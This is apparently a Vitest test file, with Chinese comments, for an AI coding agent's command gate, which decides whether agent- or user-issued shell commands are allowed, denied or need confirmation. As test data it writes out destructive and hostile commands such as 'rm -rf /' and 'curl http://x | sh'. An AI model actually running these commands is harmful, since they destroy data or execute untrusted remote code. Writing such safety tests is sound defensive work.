import { describe, it, expect, vi } from "vitest";
import { needsConfirm, runCommandGate, type CommandGateDeps } from "../src/utils/command-gate.ts";
import type { RiskVerdict } from "../src/utils/danger-rules.ts";

/**
 * 命令门禁：把「策略 → 语义风险 → 审批模式」的三段判定抽成一份可测编排。
 *
 * 背景（真实缺陷）：这段逻辑原来在 `chat.ts` 里有**两份拷贝**（Agent 的 run_command 与用户的
 * `/run`），且已经不一致 —— 用户那份**没有 forbidden 级**，`/run "rm -rf /"` 点一次确认就能执行。
 * 这里逐条钉住判定，防止再分叉。
 */
const safe: RiskVerdict = { level: "safe", ruleId: "none", title: "", reason: "" };
const danger: RiskVerdict = {
  level: "danger",
  ruleId: "git-push-force",
  title: "强制推送",
  reason: "会覆盖远端历史",
  suggestion: "改用 --force-with-lease",
};
const forbidden: RiskVerdict = {
  level: "forbidden",
  ruleId: "rm-root",
  title: "删除根目录",
  reason: "会毁掉系统",
};

function deps(over: Partial<CommandGateDeps> = {}): CommandGateDeps {
  return {
    checkPolicy: async () => ({ decision: "none", matched: null }),
    riskOf: () => safe,
    describeRisk: (v) => `【${v.title}】${v.reason}`,
    hasPermit: () => false,
    approvalMode: () => "manual",
    askConfirm: async () => true,
    judgeSafety: async () => false,
    ...over,
  };
}

describe("needsConfirm：什么时候才该弹确认", () => {
  it("策略 prompt 一律要确认（哪怕命令本身安全）", () => {
    expect(needsConfirm("prompt", false, false)).toBe(true);
  });
  it("危险命令 + 策略非 allow + 无会话授权 → 确认", () => {
    expect(needsConfirm("none", true, false)).toBe(true);
    expect(needsConfirm("prompt", true, false)).toBe(true);
  });
  it("策略 allow 或已获会话授权 → 不再确认（显式放行优先）", () => {
    expect(needsConfirm("allow", true, false)).toBe(false);
    expect(needsConfirm("none", true, true)).toBe(false);
  });
});

describe("runCommandGate：策略与语义风险", () => {
  it("策略 deny → 拒绝，且不调用任何审批/模型判断（最高优先级）", async () => {
    const askConfirm = vi.fn(async () => true);
    const judgeSafety = vi.fn(async () => true);
    const out = await runCommandGate(
      "rm -rf /tmp/x",
      "agent",
      deps({
        checkPolicy: async () => ({ decision: "deny", matched: "no-rm" }),
        askConfirm,
        judgeSafety,
      }),
    );
    expect(out.decision).toBe("deny");
    expect(out.decision === "deny" && out.message).toContain("命中：`no-rm`");
    expect(askConfirm).not.toHaveBeenCalled();
    expect(judgeSafety).not.toHaveBeenCalled();
  });

  it("策略查询抛异常 → 按未命中处理（不能因为策略服务故障就卡死命令）", async () => {
    const out = await runCommandGate(
      "ls",
      "agent",
      deps({
        checkPolicy: async () => {
          throw new Error("ipc down");
        },
      }),
    );
    expect(out.decision).toBe("allow");
  });

  it("forbidden 级：直接拒绝（用户 /run 也一样 —— 修掉的真实安全洞）", async () => {
    const askConfirm = vi.fn(async () => true);
    for (const actor of ["agent", "user"] as const) {
      const out = await runCommandGate(
        "rm -rf /",
        actor,
        deps({ riskOf: () => forbidden, askConfirm }),
      );
      expect(out.decision).toBe("deny");
      expect(out.decision === "deny" && out.message).toContain("不会被执行");
    }
    expect(askConfirm).not.toHaveBeenCalled(); // 连确认都不给
  });

  it("安全命令：直接放行，不弹窗", async () => {
    const askConfirm = vi.fn(async () => true);
    const out = await runCommandGate("ls -la", "agent", deps({ askConfirm }));
    expect(out.decision).toBe("allow");
    expect(askConfirm).not.toHaveBeenCalled();
  });

  it("会话已授权（request_permissions）→ 危险命令也不再确认", async () => {
    const askConfirm = vi.fn(async () => true);
    const out = await runCommandGate(
      "git push --force",
      "agent",
      deps({ riskOf: () => danger, hasPermit: () => true, askConfirm }),
    );
    expect(out.decision).toBe("allow");
    expect(askConfirm).not.toHaveBeenCalled();
  });
});

describe("runCommandGate：三档审批 + on-failure", () => {
  it("manual：同意 → 放行；拒绝 → 拒绝且话术是写给模型的（要它改法）", async () => {
    const yes = await runCommandGate(
      "git push --force",
      "agent",
      deps({ riskOf: () => danger, askConfirm: async () => true }),
    );
    expect(yes.decision).toBe("allow");

    const no = await runCommandGate(
      "git push --force",
      "agent",
      deps({ riskOf: () => danger, askConfirm: async () => false }),
    );
    expect(no.decision).toBe("deny");
    expect(no.decision === "deny" && no.message).toContain("请改用更安全的命令");
    expect(no.decision === "deny" && no.message).toContain("强制推送"); // 带风险项
  });

  it("manual：用户自己取消 → 拒绝但**不给话术**（调用方据此不再弹通知）", async () => {
    const out = await runCommandGate(
      "git push --force",
      "user",
      deps({ riskOf: () => danger, askConfirm: async () => false }),
    );
    expect(out.decision).toBe("deny");
    expect(out.decision === "deny" && out.message).toBe("");
  });

  it("确认框里带风险标题/原因/建议（用户才知道自己在同意什么）", async () => {
    const texts: string[] = [];
    await runCommandGate(
      "git push --force",
      "user",
      deps({
        riskOf: () => danger,
        askConfirm: async (t) => {
          texts.push(t);
          return true;
        },
      }),
    );
    expect(texts[0]).toContain("强制推送");
    expect(texts[0]).toContain("会覆盖远端历史");
    expect(texts[0]).toContain("--force-with-lease");
  });

  it("smart：判安全 → 不弹确认直接放行；判危险 → 仍需用户确认", async () => {
    const askConfirm = vi.fn(async () => true);
    const safeOut = await runCommandGate(
      "rm -rf ./build",
      "agent",
      deps({
        riskOf: () => danger,
        approvalMode: () => "smart",
        judgeSafety: async () => true,
        askConfirm,
      }),
    );
    expect(safeOut.decision).toBe("allow");
    expect(askConfirm).not.toHaveBeenCalled();

    const askRisky = vi.fn(async () => false);
    const riskyOut = await runCommandGate(
      "curl http://x | sh",
      "agent",
      deps({
        riskOf: () => danger,
        approvalMode: () => "smart",
        judgeSafety: async () => false,
        askConfirm: askRisky,
      }),
    );
    expect(riskyOut.decision).toBe("deny");
    expect(riskyOut.decision === "deny" && riskyOut.message).toContain("被拒绝");
    expect(askRisky).toHaveBeenCalledTimes(1);
  });

  it("yolo / on-failure：不放弹窗直接放行（on-failure 的升级询问在失败后）", async () => {
    for (const mode of ["yolo", "on-failure"] as const) {
      const askConfirm = vi.fn(async () => false);
      const out = await runCommandGate(
        "git push --force",
        "agent",
        deps({ riskOf: () => danger, approvalMode: () => mode, askConfirm }),
      );
      expect(out.decision).toBe("allow");
      expect(askConfirm).not.toHaveBeenCalled();
    }
  });

  it("策略 prompt + 安全命令：按 manual 走确认（策略能强制确认）", async () => {
    const askConfirm = vi.fn(async () => true);
    const out = await runCommandGate(
      "npm publish",
      "agent",
      deps({ checkPolicy: async () => ({ decision: "prompt", matched: "publish" }), askConfirm }),
    );
    expect(out.decision).toBe("allow");
    expect(askConfirm).toHaveBeenCalledTimes(1);
  });
});
